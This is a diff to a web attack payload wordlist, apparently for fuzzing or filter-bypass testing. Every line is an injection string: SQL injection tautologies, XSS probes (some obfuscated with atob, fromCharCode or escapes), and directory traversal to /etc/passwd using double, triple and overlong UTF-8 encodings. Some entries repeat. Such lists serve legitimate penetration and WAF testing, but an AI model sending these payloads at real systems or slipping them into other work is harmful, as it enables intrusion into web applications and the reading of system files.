@@ -1,14 +1,41 @@
-0x27 OR 1=1--
-%27%20OR%20%271%27%3D%271
-%27 OR 1=1--
 %27 OR %271%27=%271
+%22 OR %221%22=%221
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+%27+OR+%271%27%3D%271
+%27%09OR%09%271%27%3D%271
+%27%0aOR%0a%271%27%3D%271
+%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
 %3cscript%3ealert(1)%3c/script%3e
-%3Cscript%3Ealert%281%29%3C%2Fscript%3E
-<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
-<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
-<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
-<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
-' OR '1'%3D'1
-<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
-<svg><script>alert&#40;1&#41;</script>
-\u003cscript\u003ealert(1)\u003c/script\u003e
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+%3csvg%20onload%3dalert(1)%3e
+javascript%3Aalert(1)
+javascript%3aalert(1)
+%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29
+%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+%2e%2e%2F%65%74%63%2F%70%61%73%73%77%64
+%252e%252e%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564
+..%252f..%252f..%252fetc%252fpasswd
+..%25252f..%25252f..%25252fetc%25252fpasswd
+%c0%ae%c0%ae%c0%af%65%74%63%c0%afpasswd
+%c1%9c%2e%2e%c1%9c%65%74%63%c1%9cpasswd
+%c0%8a (newline)
+%c0%8d (carriage return)
+%c0%80 (null byte)
+%e0%80%af (/ overlong encoding)
+%e0%80%ae (. overlong encoding)
+%e0%80%bc (< overlong encoding)
+%e0%80%be (> overlong encoding)
+%e0%81%a2 (b overlong encoding)
+' OR '1'='1
+" OR "1"="1
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<script>alert(1)</script>
+' OR '1'='1
+" OR "1"="1
+&#x27; OR &#x27;1&#x27;=&#x27;1
+&#x22; OR &#x22;1&#x22;=&#x22;1
+&#60;script&#62;alert(1)&#60;/script&#62;
+&lt;script&gt;alert(1)&lt;/script&gt;
